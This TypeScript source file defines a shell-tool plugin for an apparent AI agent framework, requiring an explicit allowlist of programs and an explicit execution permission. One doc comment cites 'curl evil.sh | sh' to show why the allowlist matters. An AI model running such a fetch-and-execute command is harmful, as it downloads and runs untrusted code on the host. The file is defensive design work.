/**
 * The shell toolset — the one call a host makes.
 *
 * It insists on an **allowlist**, because a shell toolset without one is a shell,
 * and a shell handed to a model is a remote code execution vulnerability with a
 * friendly name. The `allow` option is required and has no default; an empty
 * array is a legal, explicit "nothing", but the absence of the field is not.
 */

import { PermissionSet, toolset } from '@hermes/tools';
import type { Plugin } from '@hermes/kernel';
import { allowlisted, type ShellExecutor } from './executor.js';
import { shellTools, type ShellToolsOptions } from './tools.js';

export interface ShellToolsetOptions extends ShellToolsOptions {
  /**
   * The executor. Required. Usually a {@link NodeShellExecutor}.
   *
   * No default: an executor is where processes get spawned, and defaulting to one
   * would be this package deciding a host may run programs without the host
   * saying so.
   */
  readonly executor: ShellExecutor;
  /**
   * The programs an agent may run. Required.
   *
   * There is no default and no "allow everything" shortcut, deliberately. An
   * agent that can run any program can run `curl evil.sh | sh`, so the list of
   * *which* programs is the security decision, and it must be made explicitly.
   * `['git', 'ls', 'cat']` is a real toolset; `[]` is a valid, useless one; an
   * omitted allowlist is a mistake this type does not let you make.
   */
  readonly allow: readonly string[];
  /**
   * What the tools are permitted to do. Defaults to nothing granted.
   *
   * Unlike the filesystem toolset, whose default is read-only, the shell toolset
   * grants **nothing** by default — because there is no safe subset of "run
   * commands" the way there is a safe subset of "touch files". A host that wants
   * the shell tools to work grants `shell:exec` explicitly, and that grant, next
   * to the allowlist, is the whole audit trail of what an agent may execute.
   */
  readonly granted?: PermissionSet;
  readonly name?: string;
}

/**
 * Wire shell tools into a runtime.
 *
 * ```ts
 * runtime.use(shellToolset({
 *   executor: new NodeShellExecutor({ cwd: '/srv/workspace' }),
 *   allow: ['git', 'ls', 'cat'],
 *   granted: PermissionSet.none().grant('shell:exec'),
 * }));
 * ```
 */
export function shellToolset(options: ShellToolsetOptions): Plugin {
  return toolset({
    name: options.name ?? 'shell',
    tags: ['shell'],
    granted: options.granted ?? PermissionSet.none(),
    tools: shellTools(allowlisted(options.executor, options.allow), options),
  });
}
